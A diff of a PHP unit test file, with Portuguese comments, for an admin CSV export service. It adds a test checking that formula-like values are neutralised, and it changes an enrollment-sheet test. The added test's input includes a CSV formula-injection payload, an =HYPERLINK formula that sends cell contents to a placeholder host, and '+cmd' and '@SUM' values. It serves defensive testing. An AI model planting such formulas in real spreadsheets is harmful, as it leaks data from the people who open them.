@@ -97,6 +97,25 @@ final class DadosGerenciaisAdminTest extends TestCase
         $this->assertStringContainsString("a1;\"Silva; João\";\"duas\nlinhas\";\"diz \"\"oi\"\"\";;true;80", $csv);
     }
 
+    /**
+     * O nome do aluno é digitado por ele mesmo e a planilha é aberta pelo administrador: texto que
+     * começa como fórmula tem de virar texto, senão `=HYPERLINK(...)` executa no Excel.
+     */
+    public function test_texto_que_parece_formula_sai_como_texto_no_csv(): void
+    {
+        $csv = (string) $this->servico()->csv([
+            ['a' => '=HYPERLINK("http://x/?"&A2;"clique")', 'b' => '+cmd', 'c' => '-1+1', 'd' => '@SUM(A1)', 'e' => "\t=1", 'f' => 'normal', 'g' => -5, 'h' => 3.5],
+        ]);
+
+        $this->assertStringContainsString("\"'=HYPERLINK(\"\"http://x/?\"\"&A2;\"\"clique\"\")\"", $csv);
+        $this->assertStringContainsString(";'+cmd;", $csv);
+        $this->assertStringContainsString(";'-1+1;", $csv);
+        $this->assertStringContainsString(";'@SUM(A1);", $csv);
+        $this->assertStringContainsString(";'\t=1;", $csv);
+        // O que não é fórmula, e os números de verdade, ficam como estavam.
+        $this->assertStringContainsString(';normal;-5;3.5', $csv);
+    }
+
     public function test_base_sem_registro_nao_gera_arquivo(): void
     {
         $this->assertNull($this->servico()->csv([]));
@@ -169,12 +188,11 @@ final class DadosGerenciaisAdminTest extends TestCase
     }
 
     /**
-     * Preservado de propósito (e para decisão): a base de Matrículas só lê o
-     * curso principal e os concluídos. Quem está só num curso CONCORRENTE não
-     * aparece — como no painel antigo. Mudar isso muda uma planilha que alguém
-     * já consome.
+     * Decidido em 23/10/2026: quem está só num curso CONCORRENTE entra na base de
+     * Matrículas (antes ficava de fora, como no painel React). Ninguém consumia
+     * a planilha ainda.
      */
-    public function test_matricula_so_em_curso_concorrente_nao_entra_na_base(): void
+    public function test_matricula_so_em_curso_concorrente_entra_na_base(): void
     {
         $extra = $this->curso('Curso So Concorrente');
         $aluno = $this->makeStudent('Aluno So Concorrente Base');
@@ -185,7 +203,13 @@ final class DadosGerenciaisAdminTest extends TestCase
 
         $linhas = array_filter($this->servico()->linhas('matriculas'), static fn (array $l): bool => $l['id_aluno'] === $aluno['id']);
 
-        $this->assertSame([], array_values($linhas));
+        $linhas = array_values($linhas);
+        $this->assertCount(1, $linhas);
+        $this->assertSame($extra->id, $linhas[0]['id_curso']);
+        $this->assertSame('Ativa', $linhas[0]['status_matricula']);
+        $this->assertStringEndsWith('-E1', (string) $linhas[0]['id_matricula']);
+        $this->assertSame(0, $linhas[0]['modulos_concluidos']);
+        $this->assertSame('Não', $linhas[0]['certificado_liberado']);
     }
 
     public function test_progresso_por_aula_lista_as_aulas_do_curso_na_ordem_e_ignora_curso_fora_do_catalogo(): void
